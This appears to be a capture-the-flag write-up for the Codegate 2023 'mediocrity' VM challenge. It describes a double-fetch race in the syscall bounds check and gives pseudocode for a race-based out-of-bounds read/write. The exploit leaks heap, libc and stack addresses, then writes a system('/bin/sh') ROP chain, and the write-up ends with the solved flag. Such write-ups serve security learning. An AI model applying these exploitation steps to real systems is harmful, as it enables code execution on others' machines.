# mediocrity

Mediocrity is a vm based challenge that takes a set of instructions to run, and simulate them in a child process. Due to the forking nature, the challenge does allow us to run multiple set of instructions at a time without worrying about not crashing the process.

The VM has a set of normal arithmetic, boolean, control flow, syscall and thread operations. Supported syscall are exit, read and write and thread operations is only to spawn thread/clone. Implemented VM also supports multiple mode of operation - register and memory.

### BUG

While running/handling read/write syscalls, program checks if the `buffer + size` to read/write are within the bounds of buffer or not. If buffer or buffer + size is not within the range of `0` to `0x600`, then it exits. However, for the memory mode operation, it does a double fetch of the buffer address (index) and size (to do the check and then to use it), which results in a double fetch vulnerability.

### Exploit

To exploit the bug, we repeatedly trigger the double-fetch vulnerability from the other thread multiple times to get an OOB read/write. To help with generating vm code for exploit, we wrote a simple assembler code which can be found in [vmasm.py](vmasm.py).

Following is the details of exploit:

 1. Run a sample program to set up the heap (in retrospect, I am not sure if this is required or not).
 2. Run the following program to leak heap and libc address from the heap. We basically spawn a thread and repeatedly call write syscall with valid arguments set up for memory mode addressing, while other thread tries to modify valid arguments in memory (to do OOB read). Following is the c equivalent of the asm. (I still don't know how I got a mmaped pointer in heap memory, but it was at constant offset from libc base).

 ```

  fn _start() {
     *(u64*)&mem[0] = 1             // fd
     *(u64*)&mem[8] = 0x580         // buf
     *(u64*)&mem[0x10] = 0x80       // len

     // setup write r0, r1, r2 and r3 to 1, 0, 8 and 0x10 respectively (for syscall memory mode operation)

     spawn_thread(thread1)

     while (1) {
         ret = sys_write(mem_mode, r1, r2, r3);
         if (ret == 0xe10) { // if OOB read succeeds, we will write 0xe10 bytes to fd 1
             break;
         }
     }

     sys_exit;
  }

  fn thread1() {
      while (1) {
          *(u64*)&mem[8] = -0x80 // relative offset to start writing to fd 1 from
          *(u64*)&mem[10] = 0xe10 // size to write

          *(u64*)&mem[8] = 0x580
          *(u64*)&mem[10] = 0x10
      }
  }

 ```
 3. Once we get the heap and libc leak, we can reuse similar code to leak environ variable in libc (and thus read stack pointer).
 4. Using the above code again, we read the stack (from `environ - 0x800`) to find the address where return value for `run_program` (or `sub_2fd2`) is saved on the stack.
 5. Using the target address, we now write a simple `system('/bin/sh')` rop-chain and execute shell when we return back after executing current `syscall` instruction. We do this in the following steps:
   - setup memory to do `read(0, 0x5f0, 8)` using memory mode syscall operation.
   - spawn a thread that will contantly modify the memory for buf addr from `0x5f0` to address in state where buffer/memory pointer is saved and back
     - we write to `&buffer_ptr - 0x28` mainly because we setup initial part of memory `0:0x18` for syscall operation
   - on the original thread, read repeatedly until we win the race and modify buffer pointer.
   - signal the spawned thread to stop
   - synchronize with the user (exploit script) to stop sending new address to overwrite buffer address with
   - read stack address to modify buffer again (but we don't need to race anymore as our memory/buffer overlaps with the vm state itself)
   - read/write the rop-chain on the stack
   - we should have shell now

 ```
 fn _start() {
    *(u64*)&mem[0x10] = 0          // fd
    *(u64*)&mem[0] = 0x5f0         // buf
    *(u64*)&mem[8] = 0x8           // len

    spawn_thread(thread1);

    while(1) {
        // setup args for read syscall using memory mode operation
        r0, r1, r2, r3 = 0, 0x10, 0, 8
        sys_read(mem_mode, r1, r2, r3);
        if (*(u64*)&mem[0x28] == mem) {
            break;
        }
    }

    *(u64*)&mem[8] = 0

    // synchornize with user/exploit script
    sys_write(reg_mode, 1, "hgfedcba", 8);

    *(u64*)&mem[0x18] = 0;
    while (1) {
        sys_read(reg_mode, 0, &mem[0x18], 8);
        if (*(u64*)&mem[0x18] == 'HGFEDCBA') {
            break;
        }
    }

    sys_read(reg_mode, 0, &mem[0x28], 8);
    sys_read(reg_mode, 0, &mem[0], 0x30);
    // no return as we get shell

    sys_exit // in case we didn't
 }


 fn thread() {
    while(*(u64*)&mem[8] != 0) {
          *(u64*)&mem[0] = -0x68

          *(u64*)&mem[0] = 0x5f0
    }

    while(1);
 }
 ```

Note: the exploit is not always reliable and might lead to a environ set to 0 if the mmap'd address we leaked isn't at the offset we used. However rerunning the exploit works fine.

**flag:** `codegate2023{5eb733d31e52b17829fbea79e377e652990ff021f3cd68a693c1dc0aa606c4ce6e85fe09f9c6fde560785f510e6047404ee336b1}`
